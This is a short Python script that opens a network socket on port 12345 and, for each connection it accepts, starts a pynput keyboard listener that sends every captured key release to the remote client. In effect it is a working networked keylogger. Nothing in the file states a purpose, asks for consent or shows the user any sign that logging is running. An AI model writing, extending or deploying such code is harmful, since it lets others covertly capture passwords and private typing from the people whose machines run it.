import socket
import threading
import time
from pynput import keyboard

s = socket.socket()          
print ("Socket successfully created")
  
# reserve a port on your computer (it can be anything)
port = 12345                

# listen to requests coming from any computers on the network 
s.bind(('', port))         
print ("socket binded to %s" %(port)) 
  
# put the socket into listening mode 
s.listen(5)      
print ("socket is listening") 

while True: 
  
    # Establish connection with client. 
    c, addr = s.accept()      
    print ('Got connection from', addr)


   
#{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{
    def on_press(key):
        try:
            c.send('{0}'.format(key.char).encode('utf-8'))
        except AttributeError:
            c.send('{0}'.format(key).encode('utf-8'))

    def on_release(key):
        c.send('{0}'.format(key).encode('utf-8'))
        if key == keyboard.Key.esc:
            # Stop listener
            return False

    listener = keyboard.Listener(#on_press=on_press,
                                 on_release=on_release)
    
    listener.start()
#}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}

    time.sleep(1) # add this to save ur cpu & ram!

   # Close the connection after the second loops finished (add a condition) 
    #c.close()
